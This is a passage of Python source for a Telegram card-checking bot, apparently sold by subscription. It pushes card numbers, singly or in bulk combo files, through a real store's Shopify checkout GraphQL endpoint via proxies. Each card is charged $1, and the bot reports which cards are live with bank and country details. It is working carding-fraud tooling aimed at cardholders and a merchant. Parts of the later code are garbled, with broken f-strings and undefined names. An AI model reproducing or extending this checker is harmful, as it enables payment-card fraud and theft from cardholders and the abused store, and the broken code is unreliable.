PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables': {
                'receiptId': rid,
                'sessionToken': x,
            },
        }
        elapsed_time = time.time() - start_time
        try:
            async with r.post(
                'https://www.buildingnewfoundations.com/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,
                proxy=proxy
            ) as response:
                text = await response.text()
                if response.status == 200:
                    logger.info("Initial receipt poll successful: Status 200 OK")
                else:
                    logger.error(f"Initial receipt poll failed: Status {response.status}")
                    return f"Initial receipt poll failed: Status {response.status}", proxy_used
                if "thank" in text.lower():
                    logger.info(f"Card {full_card}: Charged successfully")
                    return f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp 
""", proxy_used
                elif "actionrequiredreceipt" in text.lower():
                    logger.info(f"Card {full_card}: Approved with action required")
                    return f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", proxy_used
        except Exception as e:
            logger.error(f"Initial receipt poll exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Initial receipt poll failed: {str(e)}", proxy_used

        max_retries = 10
        for attempt in range(max_retries):
            try:
                async with r.post(
                    'https://www.buildingnewfoundations.com/checkouts/unstable/graphql',
                    params=params,
                    headers=headers,
                    json=json_data,
                    proxy=proxy
                ) as final_response:
                    final_text = await final_response.text()
                    if final_response.status == 200:
                        logger.info(f"Receipt poll attempt {attempt + 1}/{max_retries}: Status 200 OK")
                    else:
                        logger.error(f"Receipt poll attempt {attempt + 1}/{max_retries} failed: Status {final_response.status}")
                        return f"Receipt poll failed: Status {final_response.status}", proxy_used
                    fff = find_between(final_text, '"code":"', '"')
                    if "thank" in final_text.lower():
                        logger.info(f"Card {full_card}: Charged successfully")
                        return f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp 
""", proxy_used
                    elif "actionrequiredreceipt" in final_text.lower():
                        logger.info(f"Card {full_card}: Approved with action required")
                        return f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", proxy_used
                    elif "processingreceipt" in final_text.lower():
                        logger.info(f"Card {full_card}: Processing, retrying attempt {attempt + 1}/{max_retries}")
                        await asyncio.sleep(1)
                        continue
                    else:
                        logger.error(f"Card {full_card}: Declined with response code {fff}")
                        return f"""Card: {full_card}
Status: Declined!❌
Response: {fff}

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", proxy_used
            except Exception as e:
                logger.error(f"Receipt poll attempt {attempt + 1}/{max_retries} exception: {str(e)}. Proxy: {proxy}")
                proxy_used = False
                return f"Receipt poll failed: {str(e)}", proxy_used
        logger.error(f"Card {full_card}: Processing failed after {max_retries} retries")
        return f"""Card: {full_card}
Status: Declined!❌
Response: Processing Failed!

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", proxy_used

# Key System
def generate_key() -> str:
    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"FN-SHOPIFY-{part1}-{part2}"

def check_subscription(user_id: int) -> tuple[bool, Optional[str], Optional[datetime]]:
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('subscription_end') or user['subscription_end'] < datetime.utcnow():
        return False, None, None
    return True, user['tier'], user['subscription_end']

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning(f"Unauthorized /genkey attempt by user {update.effective_user.id}")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /genkey {tier} {days} {quantity}\nTiers: Gold, Platinum, Co-Owner")
        logger.warning(f"Invalid /genkey arguments by user {update.effective_user.id}")
        return
    tier, days_str, quantity_str = context.args
    if tier not in TIER_LIMITS:
        await update.message.reply_text("Invalid tier. Use: Gold, Platinum, Co-Owner")
        logger.warning(f"Invalid tier {tier} in /genkey by user {update.effective_user.id}")
        return
    try:
        days = int(days_str)
        quantity = int(quantity_str)
        if days <= 0 or quantity <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Days and quantity must be positive integers.")
        logger.warning(f"Invalid days or quantity in /genkey by user {update.effective_user.id}")
        return

    keys = []
    for _ in range(quantity):
        key = generate_key()
        keys_collection.insert_one({
            'key': key,
            'tier': tier,
            'days': days,
            'used': False,
            'created_at': datetime.utcnow()
        })
        keys.append(key)

    keys_text = '\n➔ '.join(keys)
    await update.message.reply_text(
        f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n"
        f"𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n"
        f"➔ {keys_text}\n"
        f"𝐕𝐚𝐥𝐮𝐞: {tier} {days} days\n\n"
        f"𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n"
        f"𝐓𝐲𝐩𝐞 /redeem {{key}}",
        parse_mode='Markdown'
    )
    logger.info(f"User {update.effective_user.id} generated {quantity} {tier} keys for {days} days")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /redeem {key}")
        logger.warning(f"User {update.effective_user.id} attempted /redeem without key")
        return
    key = context.args[0]
    key_data = keys_collection.find_one({'key': key, 'used': False})
    if not key_data:
        await update.message.reply_text("Invalid or already used key.")
        logger.warning(f"User {update.effective_user.id} attempted to redeem invalid key {key}")
        return

    user_id = update.effective_user.id
    tier = key_data['tier']
    days = key_data['days']
    subscription_end = datetime.utcnow() + timedelta(days=days)

    users_collection.update_one(
        {'user_id': user_id},
        {
            '$set': {
                'user_id': user_id,
                'tier': tier,
                'subscription_end': subscription_end
            }
        },
        upsert=True
    )
    keys_collection.update_one({'key': key}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.utcnow()}})

    await update.message.reply_text(
        f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧 🎉\n\n"
        f"𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n"
        f"𝐕𝐚𝐥𝐮𝐞: {tier} {days} days\n\n"
        f"𝐓𝐡𝐚𝐧𝐤 𝐘𝐨𝐮",
        parse_mode='Markdown'
    )
    logger.info(f"User {user_id} redeemed key {key} for {tier} ({days} days)")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning(f"Failed to execute unauthorized action by user {update.effective_user.id}}")
        return
    if not context.args:
        await update.message.reply_text("Usage: /delkey {user_id}")
        logger.error(f"User provided invalid ID {arguments} by {user_id}")
        return
    try:
        user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID.")
        logger.warning(f"Invalid user_id in /delkey by user {update.effective_user.id}")
        return

    result = users_collection.delete_one({'user_id': user_id})
    if result.deleted_count > 0:
        await update.message.reply_text(f"Subscription for user {user_id}} has been cancelled")
        logger.info(f"User {user_id} subscription deleted by {update.effective_user.id}")
    else:
        await update.message.reply_text(f"No subscription found for user {user_id}.")
        logger.info(f"No subscription found for user {user_id} in /delkey by user {update.effective_user.id}")

async def broadcast(update: Update, context: contextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to perform this action.")
        logger.warning(f"Unauthorized action attempted by user {user_id}}")
        return
    if not context.args:
        await update.message.reply_text("Please use: /broadcast {message}")
        logger.warning(f"Invalid /broadcast arguments by user {user_id}}")
        return
    message_content = ' '.join(context.args_message_content)
    users_content = users_collection.find({{'subscriptions_end': {'$gte': datetime.utcnow()}})
    sent_messages = 0
    failed_messages = 0

    for user in users_content:
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                message_content=message_content
            )
            sent_messages += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Failed to send broadcast to user {user_id}: {e}")
            failed_messages += 1

    await update.message.reply_text(f"Broadcast sent to {sent_messages} users. Failed: {failed_messages}")
    logger.info(f"Sent to {sent_messages} users, failed: {failed_messages} by {user_id}")

# Telegram Bot Handlers
async def start_check(update: Update, context: ContextTypes.DEFAULT):
    keyboard_buttons = [
        [InlineKeyboardButton("Initiate File Upload", callback_data='start_file_upload')],
        [InlineKeyboardButton("Cancel Batch Check", callback_data='cancel_check_batch')],
        [InlineKeyboardButton("Support", callback_data='start_check')],
    ]
    reply_buttons = InlineKeyboardMarkup(keyboard_buttons)
    await update.message.reply_text(
        "🔥 Welcome to FN Mass Checker Bot!\n\n"
        "🔍 Use /single_check to process a single card\n"
        "🛑 Use /stop_check to halt processing\n"
        "🔑 Use /redeem_key {key_id} to activate your subscription\n"
        "📂 Upload a combo file or use the button below:",
        reply_buttons=reply_buttons
    )
    logger.info(f"User {id} initiated bot session")

async def single_check(update: Update, context: ContextTypes.DEFAULT):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        has_subscription, _, _ = check_subscription(user_id)
        if not has_subscription:
            await update.message.reply_text("You need an active subscription to use this bot. Use /redeem {key} to activate.")
            logger.warning(f"User {user_id} attempted /sh without subscription")
            return
    if not context.args:
        await update.message.reply_text("Please provide a card in the format: /sh 4242424242424242|01|29|123")
        logger.warning(f"User {user_id} attempted /sh without card details")
        return
    card = " ".join(context.args)
    checking_msg = await update.message.reply_text("🔍 Checking Your Card...")
    logger.info(f"User {user_id} initiated single card check: {card}")
    try:
        result, proxy_used = await sh(card)
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
    except Exception as e:
        logger.error(f"Single card check failed for user {user_id}: {str(e)}")
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
        await update.message.reply_text("Error checking card.")
        return

    result_lines = result.split('\n')
    card_info = result_lines[4].split('Details: ')[1]
    issuer = result_lines[5].split('Bank: ')[1]
    country_display = result_lines[6].split('Country: ')[1]
    response = result_lines[2].split('Response: ')[1]
    full_card = result_lines[0].split('Card: ')[1]

    checked_by = f"<a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a>"
    proxy_status = "Live✅" if proxy_used else "Dead❌"

    if "Charged" in result or "Approved" in result:
        await update.message.reply_text(
            f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥\n\n"
            f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{full_card}></code>\n
            f"[ϟ] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Shopify Payments 1$\n
            f"[ϟ] 𝗥𝗲𝘀𝗣𝗼𝗻𝘀𝗲: {response}}\n\n"
            f"[ϟ] 𝗜𝗻𝗳𝗼: {card_info}\n
            f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿: {issuer} 🏛️\n
            f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_display}\n\n
            f"[⌬] 𝗣𝗿𝗼𝘅𝘆: {proxy_status}\n
            f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {checked_by}\n
            f"[⌬] 𝗕𝗼𝘁: @FN_B3_AUTH",
            parse_mode='HTML'
        )
        logger.info(f"User {user_id} card check: {full_card} - Charged/Successful")
    else:
        await update.message.reply_text(
            f"𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝗱 ❌\n\n"
            f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{full_card}></code>\n
            f"[ϟ] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Shopify Payments 1$\n
            f"[ϟ] 𝗥𝗲𝘀𝗣𝗼𝗻𝘀𝗲: {response}}\n\n"
            f"[ϟ] 𝗜𝗻𝗳𝗼: {card_info}\n
            f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿: {issuer} 🏛️\n
            f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_display}\n\n
            f"[⌬] 𝗣𝗿𝗼𝘅𝘆: {proxy_status}\n
            f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {checked_by}\n
            f"[⌬] 𝗕𝗼𝘁: @FN_B3_AUTH",
            parse_mode='HTML'
        )
        logger.info(f"User {user_id} card check failed: {full_card} - Declined")

checking_tasks: Dict[int, dict] = {}

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await update.message.reply_text("Checking stopped")
        logger.info(f"User {user_id} stopped checking process")
    else:
        await update.message.reply_text("No active checking process to stop.")
        logger.warning(f"User {user_id} attempted to stop non-existent checking process")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == 'upload_file':
        await query.edit_message_text("Please send your .txt file for checking")
        logger.info(f"User {user_id} requested to upload file")
    elif query.data == 'cancel_check':
        if user_id in checking_tasks:
            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("Checking cancelled")
            logger.info(f"User {user_id} cancelled checking via button")
        else:
            await query.edit_message_text("No active checking process to cancel.")
            logger.warning(f"User {user_id} attempted to cancel non-existent checking process")
    elif query.data == 'help':
        await query.edit_message_text(
            "Help: Use /sh to check a single card, /stop to stop checking, "
            "/redeem {key} to activate subscription, or upload a .txt file for batch checking."
        )
        logger.info(f"User {user_id} accessed help")

async def batch_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == 'stop_batch':
        if user_id in checking_tasks:
            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("Checking stopped")
            logger.info(f"User {user_id} stopped batch checking")
        else:
            await query.message.reply_text("No active checking process to stop.")
            logger.warning(f"User {user_id} attempted to stop non-existent batch checking")
    elif query.data in ['charged', 'declined', 'total', 'response']:
        logger.info(f"User {user_id} interacted with read-only button {query.data}")

async def process_batch(user_id: int, cards: List[str], update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg_id: int):
    total = len(cards)
    charged = 0
    declined = 0
    start_time = time.time()
    charged_cards = []
    checked_by = f"<a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a>"

    async def check_card(card: str) -> tuple[str, bool]:
        try:
            result, proxy_used = await sh(card)
            return result, proxy_used
        except Exception as e:
            logger.error(f"Card check failed for user {user_id} on card {card}: {str(e)}")
            return f"Error checking card: {str(e)}", False

    while cards and not checking_tasks[user_id]['stop']:
        batch = cards[:CONCURRENT_LIMIT]
        cards = cards[CONCURRENT_LIMIT:]

        tasks = [check_card(card) for card in batch]
        results = await asyncio.gather(*tasks)

        for card, (result, proxy_used) in zip(batch, results):
            if checking_tasks[user_id]['stop']:
                break

            if "Error checking card" in result:
                declined += 1
                continue

            lines = result.split('\n')
            card_info = lines[4].split('Details: ')[1]
            issuer = lines[5].split('Bank: ')[1]
            country_display = lines[6].split('Country: ')[1]
            response = lines[2].split('Response: ')[1]
            full_card = lines[0].split('Card: ')[1]
            proxy_status = "Live✅" if proxy_used else "Dead❌"

            if "Charged" in result or "Approved" in result:
                charged += 1
                charged_cards.append(full_card)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    message=f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥\n\n"
                         f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{full_card}</code>\n"
                         f"[ϟ] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Shopify 1$\n"
                         f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {response}\n\n"
                         f"[ϟ] 𝗜𝗻𝗳𝗼: {card_info}\n"
                         f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿: {issuer} 🏛️\n"
                         f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_display}\n\n"
                         f"[⌬] 𝗣𝗿𝗼𝘅𝘆: {proxy_status}\n"
                         f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {checked_by}\n"
                         f"[🎖] 𝗕𝗼𝘁: @FN_B3_AUTH",
                    parse_mode='HTML'
                )
                logger.info(f"User {user_id} batch card check successful: {full_card} - Charged/Approved")
            else:
                declined += 1
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                         f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{full_card}</code>\n"
                         f"[ϟ] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Shopify 1$\n"
                         f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {response}\n\n"
                         f"[ϟ] 𝗜𝗻𝗳𝗼: {card_info}\n"
                         f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿: {issuer} 🏛️\n"
                         f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_display}\n\n"
                         f"[⌬] 𝗣𝗿𝗼𝘅𝘆: {proxy_status}\n"
                         f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {checked_by}\n"
                         f"[🎖] 𝗕𝗼𝘁: @FN_B3_AUTH",
                    parse_mode='HTML'
                )
                logger.info(f"User {user_id} batch card check failed: {full_card} - Declined")

            keyboard = [
                [InlineKeyboardButton(f"Charged🔥: {charged}", callback_data='charged')],
                [InlineKeyboardButton(f"Declined❌: {declined}", callback_data='declined')],
                [InlineKeyboardButton(f"Total💳: {total}", callback_data='total')],
                [InlineKeyboardButton(f"Stop🔴", callback_data='stop_batch')],
                [InlineKeyboardButton(f"Response💸: {response}", callback_data='response')],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg_id,
